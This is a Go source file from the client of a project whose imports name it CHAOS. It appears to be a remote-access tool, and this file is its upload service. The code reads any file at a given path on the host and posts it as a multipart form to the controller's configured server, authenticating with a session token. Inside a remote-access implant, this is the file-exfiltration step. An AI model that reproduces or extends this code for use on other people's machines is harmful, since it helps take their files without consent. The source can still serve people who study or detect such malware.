package upload

import (
	"bytes"
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"
)

type Service struct {
	Configuration *environment.Configuration
	HttpClient    *http.Client
}

func NewService(configuration *environment.Configuration, httpClient *http.Client) services.Upload {
	return &Service{
		Configuration: configuration,
		HttpClient:    httpClient,
	}
}

func (u Service) UploadFile(path string) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	fi, err := file.Stat()
	if err != nil {
		return nil, err
	}
	file.Close()

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", fi.Name())
	if err != nil {
		return nil, err
	}
	part.Write(fileBytes)

	err = writer.Close()
	if err != nil {
		return nil, err
	}

	url := fmt.Sprint(u.Configuration.Server.Url, "upload")
	request, err := http.NewRequest(http.MethodPost, url, body)
	request.Header.Set("Cookie", u.Configuration.Connection.Token)
	request.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		return nil, err
	}

	res, err := u.HttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf(strconv.Itoa(res.StatusCode))
	}
	return ioutil.ReadAll(res.Body)
}
